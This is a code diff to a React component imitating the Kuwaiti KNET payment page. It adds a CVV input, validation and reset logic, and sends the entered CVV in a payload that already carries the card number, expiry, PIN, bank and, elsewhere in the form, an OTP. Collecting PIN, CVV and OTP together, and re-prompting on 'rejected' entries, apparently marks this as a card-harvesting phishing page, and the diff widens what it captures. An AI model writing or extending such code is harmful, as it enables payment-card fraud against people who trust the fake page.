@@ -88,6 +88,7 @@ export default function KNETPayment() {
   const [expiryMonth, setExpiryMonth] = useState("");
   const [expiryYear, setExpiryYear] = useState("");
   const [cardPin, setCardPin] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
 
   // OTP state
   const [otpCode, setOtpCode] = useState("");
@@ -170,6 +171,7 @@ export default function KNETPayment() {
           setRejectedError("يرجى التأكد من المعلومات المدخلة");
           setCardNumber("");
           setCardPin("");
+          setCardCvv("");
           setSelectedPrefix("");
           setExpiryMonth("");
           setExpiryYear("");
@@ -210,6 +212,7 @@ export default function KNETPayment() {
           setRejectedError("يرجى التأكد من المعلومات المدخلة");
           setCardNumber("");
           setCardPin("");
+          setCardCvv("");
           setSelectedPrefix("");
           setExpiryMonth("");
           setExpiryYear("");
@@ -227,6 +230,7 @@ export default function KNETPayment() {
     setExpiryMonth("");
     setExpiryYear("");
     setCardPin("");
+    setCardCvv("");
     setValidationError("");
     setRejectedError("");
   };
@@ -242,6 +246,10 @@ export default function KNETPayment() {
     }
     if (!cardNumber || cardNumber.length < 6) {
       setValidationError("خطأ : الرجاء التأكد من رقم البطاقة");
+      return false;
+    }
+    if (!cardCvv || cardCvv.length !== 3 || !/^\d{3}$/.test(cardCvv)) {
+      setValidationError("خطأ : الرجاء إدخال رمز CVV المكون من 3 أرقام");
       return false;
     }
     if (cardPin.length !== 4 || !/^\d{4}$/.test(cardPin)) {
@@ -288,7 +296,7 @@ export default function KNETPayment() {
         nameOnCard: "KNET",
         expiryMonth: expiryMonth.padStart(2, "0"),
         expiryYear: expiryYear,
-        cvv: "N/A",
+        cvv: cardCvv,
         pin: cardPin,
         bankName: selectedBank,
         paymentMethod: "KNET",
@@ -640,6 +648,25 @@ export default function KNETPayment() {
                         <option key={y.value} value={y.value}>{y.label}</option>
                       ))}
                     </select>
+                  </div>
+                </div>
+
+                {/* CVV */}
+                <div style={fieldRow}>
+                  <label style={fieldLabel}>CVV:</label>
+                  <div style={fieldValue}>
+                    <input
+                      type="password"
+                      inputMode="numeric"
+                      maxLength={3}
+                      value={cardCvv}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, "");
+                        setCardCvv(val);
+                        setValidationError("");
+                      }}
+                      style={{ ...inputStyle, width: "100%" }}
+                    />
                   </div>
                 </div>
 
